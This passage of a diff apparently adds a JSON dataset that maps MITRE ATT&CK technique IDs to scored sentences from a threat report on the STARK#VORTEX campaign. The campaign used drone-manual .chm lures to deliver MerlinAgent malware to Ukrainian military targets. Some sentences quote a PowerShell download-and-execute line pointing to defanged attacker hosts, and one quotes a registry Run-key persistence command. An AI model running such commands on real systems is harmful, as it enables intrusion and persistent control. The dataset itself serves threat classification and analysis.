+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.5803
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.3141
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.3982
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.4124
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.6985
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.3869
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.6811
+      },
+      {
+        "sentence": "This does speculate that it was probably not intended for business systems where games would normally not be found.",
+        "score": 0.3717
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.3308
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.3259
+      }
+    ],
+    "T1059.001": [
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.4089
+      },
+      {
+        "sentence": "As the war between Russia and Ukraine rages, the cyber warfare landscape between the two countries also continues to show no signs of slowing down.",
+        "score": 0.3556
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.4041
+      },
+      {
+        "sentence": "Our team has identified an interesting campaign (tracked by Securonix as STARK#VORTEX), which is actively targeting Ukraine’s military.",
+        "score": 0.353
+      },
+      {
+        "sentence": "Last month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net).",
+        "score": 0.3397
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.4181
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.3353
+      },
+      {
+        "sentence": "Microsoft help files are a typical file format which are used to provide application support, guides and references.",
+        "score": 0.3789
+      },
+      {
+        "sentence": "Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.",
+        "score": 0.375
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.5963
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.4259
+      },
+      {
+        "sentence": "Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.",
+        "score": 0.3911
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.4029
+      },
+      {
+        "sentence": "We’ll go over each stage in detail further down.",
+        "score": 0.3178
+      },
+      {
+        "sentence": "Initial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine.",
+        "score": 0.6234
+      },
+      {
+        "sentence": "They can, however, be opened and executed in modern Windows versions.",
+        "score": 0.439
+      },
+      {
+        "sentence": "Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.",
+        "score": 0.4315
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.3842
+      },
+      {
+        "sentence": "Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one.",
+        "score": 0.4309
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.6146
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.4162
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.4673
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.3865
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.4061
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.6152
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.6988
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.5423
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.3971
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.4626
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.4047
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.3293
+      },
+      {
+        "sentence": "Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.",
+        "score": 0.452
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.5428
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.4483
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.531
+      },
+      {
+        "sentence": "The bulk of the code is stored inside the doS function which is called at the end of the script.",
+        "score": 0.4916
+      },
+      {
+        "sentence": "Next the script performs key functions: - Constructs the target path. - Checks if the executable file already exists at the defined path, returning -1 if it does. - Ensures that the necessary directory exists, creating it if needed. - Checks the success of directory creation, returning -2 if it fails.",
+        "score": 0.3288
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.5503
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.6174
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.4876
+      },
+      {
+        "sentence": "Compute the hash and fill the XOR mask - A SHA-256 hasher is initialized. - The input string $cryptPS is hashed to produce an array, $sha. - This hash is then used to populate the $xorMask array.",
+        "score": 0.4015
+      },
+      {
+        "sentence": "If the mask requires more bytes than the initial hash provides, the hash of the previous hash is used in a chained fashion until the mask is completely filled.",
+        "score": 0.3446
+      },
+      {
+        "sentence": "Note: The outer while($false) is odd since it renders the entire subsequent code block ineffective.",
+        "score": 0.4083
+      },
+      {
+        "sentence": "It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.",
+        "score": 0.3231
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.4177
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.4273
+      },
+      {
+        "sentence": "The last portion of the script then executes the original file in a few different ways.",
+        "score": 0.5221
+      },
+      {
+        "sentence": "The PowerShell script appears to be written with several options and configurations in mind, hence the $false while statement we mentioned earlier.",
+        "score": 0.5621
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.3507
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.5374
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.4335
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.496
+      },
+      {
+        "sentence": "Similar to Cobalt Strike and Silver, MerlinAgent is an open source command and control framework available on Github.",
+        "score": 0.3755
+      },
+      {
+        "sentence": "It functions similar to that of Cobalt Strike or Sliver where a server instance can be set up which can build its own binary payloads.",
+        "score": 0.5962
+      },
+      {
+        "sentence": "Attackers can then distribute these payloads and incorporate them into their own malware stager or loader.",
+        "score": 0.5148
+      },
+      {
+        "sentence": "MerlinAgent has a wide range of capabilities which include: - Encrypted C2 communication using TLS - Remote command shell - Module support (such as Mimikatz) - Binary support for exe or dll clients The agent itself supports a wide range of command flags in which blue team defenders can be on the lookout for: | Command | Description | | -debug | Enable debug output | | -host | HTTP Host header | | -ja3 | JA3 signature string (not the MD5 hash).",
+        "score": 0.5684
+      },
+      {
+        "sentence": "Upon execution, the MerlinAgent payload will immediately begin beaconing to listen.servemp3[.]com.",
+        "score": 0.3674
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.4876
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.4855
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.4136
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.4564
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.3824
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.4521
+      },
+      {
+        "sentence": "C2 and infrastructure During the STARK#VORTEX campaign we observed the following network communication to C2 hosts.",
+        "score": 0.3513
+      },
+      {
+        "sentence": "Request related details will be provided in Appendix A below. | C2 Address | Description | | catbox[.]moe | Executable file stager location.",
+        "score": 0.3552
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.4482
+      },
+      {
+        "sentence": "29, 2023: The STARK#VORTEX attack campaign surges on as the Securonix Threat Research team continues to monitor the skies for changes and new vectors.",
+        "score": 0.3524
+      },
+      {
+        "sentence": "Currently, it would appear that the threat actors have shifted to a new staging domain while many of the TTPs have remained the same.",
+        "score": 0.3605
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.3235
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.3422
+      },
+      {
+        "sentence": "It would appear that the threat actors shifted gears into using Minecraft-themed C2 servers and payloads.",
+        "score": 0.3894
+      },
+      {
+        "sentence": "The lure document has also been retargeted.",
+        "score": 0.3313
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.3861
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.4913
+      },
+      {
+        "sentence": "The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”.",
+        "score": 0.35
+      },
+      {
+        "sentence": "When opened, the content of the lure file simply contains a few company logos.",
+        "score": 0.3561
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.6448
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.6686
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.4241
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.4951
+      },
+      {
+        "sentence": "This does speculate that it was probably not intended for business systems where games would normally not be found.",
+        "score": 0.3654
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.448
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.4119
+      },
+      {
+        "sentence": "Updated IoCs and Seeder hunting queries can be found below.",
+        "score": 0.3331
+      }
+    ],
+    "T1204.002": [
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.5863
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.3003
+      },
+      {
+        "sentence": "Since drones or unmanned aerial vehicles (UAVs) have been an integral tool used by the Ukrainian military, malware-laced lure files themed as UAVs service manuals have begun to surface.",
+        "score": 0.4402
+      },
+      {
+        "sentence": "Last month, the threat group tracked by the identifier UAC-0154 was identified using military-themed documents delivered via email to Ukrainian targets (@ukr.net).",
+        "score": 0.4415
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.4709
+      },
+      {
+        "sentence": "Attack chain overview The lure file presents itself as a Microsoft Help file, or .chm file.",
+        "score": 0.5872
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.3085
+      },
+      {
+        "sentence": "Microsoft help files are a typical file format which are used to provide application support, guides and references.",
+        "score": 0.3944
+      },
+      {
+        "sentence": "Code execution begins as soon as the user opens the document through a malicious JavaScript code block embedded inside one of the HTML pages.",
+        "score": 0.7457
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.3982
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.3413
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.3787
+      },
+      {
+        "sentence": "We’ll go over each stage in detail further down.",
+        "score": 0.3315
+      },
+      {
+        "sentence": "Initial code execution The malicious .chm file was intentionally weaponized to execute a PowerShell one-liner on the victim machine.",
+        "score": 0.453
+      },
+      {
+        "sentence": "Microsoft help files have been used maliciously in the past, though today they are less common as Microsoft stopped supporting the .chm file format in 2007.",
+        "score": 0.4884
+      },
+      {
+        "sentence": "They can, however, be opened and executed in modern Windows versions.",
+        "score": 0.7069
+      },
+      {
+        "sentence": "Help files such as the lure document used in the STARK#VORTEX campaign, would be executed using the Windows binary hh.exe which is launched automatically when a user runs the .chm file.",
+        "score": 0.7006
+      },
+      {
+        "sentence": "As you can see from the figure below, the help file would have no trouble evading antivirus and EDR detections as it scored 0/59 detections in VirusTotal.",
+        "score": 0.3207
+      },
+      {
+        "sentence": "Figure 1: VirusTotal detections for Інфо про навчання по БПЛА для військових.v2.2.chm Code execution through a .chm file is a well known technique and there are several online tools available for building one.",
+        "score": 0.4424
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.3724
+      },
+      {
+        "sentence": "As we mentioned previously, the lure document was themed as a drone or UAV manual.",
+        "score": 0.4982
+      },
+      {
+        "sentence": "Examining its contents, we see instructions written in the Ukrainian language for a DJI Mavic 3 drone.",
+        "score": 0.3205
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.5778
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.3352
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.3266
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.4579
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.4184
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.3981
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.3401
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.3666
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.3237
+      },
+      {
+        "sentence": "Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.",
+        "score": 0.4111
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.4384
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.3143
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.3304
+      },
+      {
+        "sentence": "The bulk of the code is stored inside the doS function which is called at the end of the script.",
+        "score": 0.3289
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.3516
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.3841
+      },
+      {
+        "sentence": "Further down the script we find some interesting binary file manipulation code blocks which can be seen in figure 8 below: Figure 8: Deobfuscated PowerShell — binary file decoding In a nutshell, the downloaded binary file is decoded and renamed using values provided from the beginning of the script as seen in figure 7.",
+        "score": 0.4184
+      },
+      {
+        "sentence": "It could be a mistake by the attackers, or it could act as a placeholder for other binary files that would require its specific functionality.",
+        "score": 0.3323
+      },
+      {
+        "sentence": "With the file decoded into a variable, the next portion of the script then saves it over the original file after leveraging and then deleting a temporary file.",
+        "score": 0.3344
+      },
+      {
+        "sentence": "Figure 9: Stage 3, deobfuscated PowerShell The last bit of code takes a previously downloaded, encrypted and compressed file with a .tmp extension, decompresses its content, writes the decompressed content back to the original file, deletes the .tmp file.",
+        "score": 0.3509
+      },
+      {
+        "sentence": "The last portion of the script then executes the original file in a few different ways.",
+        "score": 0.4494
+      },
+      {
+        "sentence": "Also the existence of optional binary file arguments which were set to “null” in this case.",
+        "score": 0.3184
+      },
+      {
+        "sentence": "Binary file analysis The Windows binary file downloaded is a 64-bit executable at about 5MB in size.",
+        "score": 0.4698
+      },
+      {
+        "sentence": "Some additional binary information is highlighted in figure 10 below.",
+        "score": 0.3738
+      },
+      {
+        "sentence": "Figure 10: ctlhost.exe — binary file overview Upon closer examination, it appears to be a generated binary executable by the MerlinAgent framework.",
+        "score": 0.4334
+      },
+      {
+        "sentence": "It also establishes persistence in the registry by creating a new key called “ctlhost” located in “HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” with the contents “cmd.exe /c start /min %windir%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command Start-Process -filepath “C:\\Users\\[REDACTED]\\Appdata\\Roaming\\sysctlHost\\ctlhost.exe” -WindowStyle Hidden”.",
+        "score": 0.323
+      },
+      {
+        "sentence": "This will execute the binary file every time the user logs into the system.",
+        "score": 0.4497
+      },
+      {
+        "sentence": "Once the process establishes a connection to the attacker’s C2 server, the attacker will have full control over the system.",
+        "score": 0.3114
+      },
+      {
+        "sentence": "Wrapping up… It’s apparent that this attack was highly targeted towards the Ukrainian military given the language of the document, and its targeted nature.",
+        "score": 0.4374
+      },
+      {
+        "sentence": "Files and documents used in the attack chain are very capable of bypassing defenses, scoring 0 detections for the malicious .chm file.",
+        "score": 0.4715
+      },
+      {
+        "sentence": "Typically receiving a Microsoft help file over the internet would be considered unusual.",
+        "score": 0.3937
+      },
+      {
+        "sentence": "However, the attackers framed the lure documents to appear as something an unsuspecting victim might expect to appear in a help themed document or file .",
+        "score": 0.5707
+      },
+      {
+        "sentence": "Catbox is a legitimate file sharing service. | listen.servemp3[.]com 168.100.8[.]245 | Beacon C2 URL from ctlhost.exe | Securonix recommendations and mitigations Always be extra cautious downloading file attachments from posts for private messages.",
+        "score": 0.4768
+      },
+      {
+        "sentence": "The naming scheme of the binary files has also changed.",
+        "score": 0.4121
+      },
+      {
+        "sentence": "This time around the MerlinAgent payload appears to be masquerading as the popular building/adventure game Minecraft.",
+        "score": 0.3337
+      },
+      {
+        "sentence": "The lure document has also been retargeted.",
+        "score": 0.5068
+      },
+      {
+        "sentence": "As you can see in the figure below, the document, now named “Confidential Offers.chm” follows the same malicious pattern originally observed with the STARK#VORTEX campaign.",
+        "score": 0.5098
+      },
+      {
+        "sentence": "Figure 1: Confidential Offers.chm lure document The help file contains a single html file which executes the malicious JavaScript payload.",
+        "score": 0.6442
+      },
+      {
+        "sentence": "The HTML file is titled “Міжнародні партнери” which translates from Ukrainian to “International partners”.",
+        "score": 0.3126
+      },
+      {
+        "sentence": "When opened, the content of the lure file simply contains a few company logos.",
+        "score": 0.6437
+      },
+      {
+        "sentence": "Like the original attack campaign, the latest version contains a highly-obfuscated JavaScript code block which calls and executes another obfuscated PowerShell one-liner.",
+        "score": 0.3839
+      },
+      {
+        "sentence": "Figure 2: Obfuscated JavaScript sample executed by Confidential Offers.chm The PowerShell script downloads a binary MerlinAgent payload from hxxps://shorturl[.]at/abPU5 which redirects to hxxps://files.catbox[.]moe/sbjchf.mod.",
+        "score": 0.4095
+      },
+      {
+        "sentence": "The encoded payload is decoded and then executed in almost the same fashion as we saw before.",
+        "score": 0.4223
+      },
+      {
+        "sentence": "The binary payload which gets downloaded and executed is named “minecraft.exe” and is placed in the directory “%appdata%/local/games/minecraft.exe” and the C2 beaconing address is listen.serveminecraft[.]net.",
+        "score": 0.3535
+      },
+      {
+        "sentence": "Wrapping up… Today, we won’t go too deep into the rest of the attack chain as it is almost identical to what we first encountered last week.",
+        "score": 0.3509
+      },
+      {
+        "sentence": "The original analysis of the STARK#VORTEX campaign contains a much more in-depth analysis.",
+        "score": 0.4011
+      }
+    ],
+    "T1573.001": [
+      {
+        "sentence": "6, 2023 tldr: Securonix Threat Research recently discovered an attack campaign appearing to originate from the threat group UAC-0154 targeting victims using a Pilot-in-Command (PIC) Drone manual document lure to deliver malware.",
+        "score": 0.3191
+      },
+      {
+        "sentence": "New tactics and malware variants continue to emerge as we’re entering the year and a half mark of the conflict.",
+        "score": 0.3456
+      },
+      {
+        "sentence": "Today, it would appear that the group’s tactics have changed, along with some of the methods used to infect victims with MerlinAgent malware.",
+        "score": 0.3152
+      },
+      {
+        "sentence": "The file in this case was named “Інфо про навчання по БПЛА для військових.v2.2.chm” which translates to “info on UAV training for the military”.",
+        "score": 0.3595
+      },
+      {
+        "sentence": "Obfuscated PowerShell code is then executed from the JavaScript code within the .chm file which was used to contact a remote C2 server to download an obfuscated binary payload.",
+        "score": 0.5731
+      },
+      {
+        "sentence": "The payload is an obfuscated binary that gets XOR’d and decoded to produce a beacon payload for MerlinAgent malware.",
+        "score": 0.5786
+      },
+      {
+        "sentence": "Once the payload establishes communication back to its C2 server, the attackers would have full control over the victim host.",
+        "score": 0.5829
+      },
+      {
+        "sentence": "While the attack chain is quite simple, the attackers leveraged some pretty complex TTPs and obfuscation methods in order to evade detection.",
+        "score": 0.4189
+      },
+      {
+        "sentence": "We’ll go over each stage in detail further down.",
+        "score": 0.321
+      },
+      {
+        "sentence": "It works by passing in special HTML parameters which can call a child process such as cmd.exe or powershell.exe, along with command line arguments.",
+        "score": 0.3112
+      },
+      {
+        "sentence": "Figure 2: lure document contents for Інфо про навчання по БПЛА для військових.v2.2.chm Help file and JavaScript execution [] Since Microsoft help files are essentially container files, they can be opened and analyzed using file archival software such as 7zip.",
+        "score": 0.3312
+      },
+      {
+        "sentence": "With the case of Інфо про навчання по БПЛА для військових.v2.2.chm, we’re able to observe several HTML files contained within.",
+        "score": 0.361
+      },
+      {
+        "sentence": "Figure 3: Contents of Інфо про навчання по БПЛА для військових.v2.2.chm After examining the contents of page1.html, we found a huge JavaScript one liner embedded into the HTML within <script></script> tags.",
+        "score": 0.3349
+      },
+      {
+        "sentence": "Its contents were heavily obfuscated, however we observed it executing another obfuscated PowerShell script which we’ll dive into next.",
+        "score": 0.3987
+      },
+      {
+        "sentence": "Figure 4: Example of obfuscated JavaScript code found within page1.html PowerShell execution [] The .chm file executes cmd.exe along with the “/c start /min” commands to call the PowerShell process which executes inside a hidden window.",
+        "score": 0.4224
+      },
+      {
+        "sentence": "The PowerShell code is heavily obfuscated in order to evade detections.",
+        "score": 0.3973
+      },
+      {
+        "sentence": "Some obfuscation methods include Base64 encoding, GZIP compression, and char value substitutions.",
+        "score": 0.6073
+      },
+      {
+        "sentence": "Figure 5: Stage 1, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm After deobfuscating the Base64 encoded blob, we find more obfuscated PowerShell code.",
+        "score": 0.4614
+      },
+      {
+        "sentence": "This time some key information such as C2 URL and payload names become visible.",
+        "score": 0.5867
+      },
+      {
+        "sentence": "This is seen in the figure below.",
+        "score": 0.3136
+      },
+      {
+        "sentence": "Next, we’ll clean this code up and go over it in detail to gain a better understanding of its purpose.",
+        "score": 0.3483
+      },
+      {
+        "sentence": "Figure 6: Stage 2, obfuscated PowerShell executed by Інфо про навчання по БПЛА для військових.v2.2.chm With the PowerShell code a bit more human-readable, it’s pretty clear as to what it’s doing.",
+        "score": 0.4384
+      },
+      {
+        "sentence": "In general, the script downloads a payload from hxxps://files.catbox[.]moe/g1h7zr.bin decodes and decrypts it and saves it to the local Appdata folder to SysctlHost\\ctlhost.exe.",
+        "score": 0.4555
+      },
+      {
+        "sentence": "Figure 7: Deobfuscated PowerShell analysis — file download, directory setup This first bit of the script establishes a few variables such as the C2 URL ($plUrl), binary path ($plPathSuffix), decryption key ($cryptPS) and the XOR mask size value ($xorMaskSize).",
+        "score": 0.6124
+      },
+      {
+        "sentence": "The script then downloads the file from the C2 server.",
+        "score": 0.3805
+      },
+      {
+        "sentence": "The command, as you can see is heavily obfuscated, however deobfuscating the PowerShell code produces the following download command: [System.Net.WebClient]::new().DownloadFile(‘hxxps://files.catbox[.]moe/g1h7zr.bin’, ”) The command is then executed using an invoke expression (IEX).",
+        "score": 0.4664
+      },
+      {
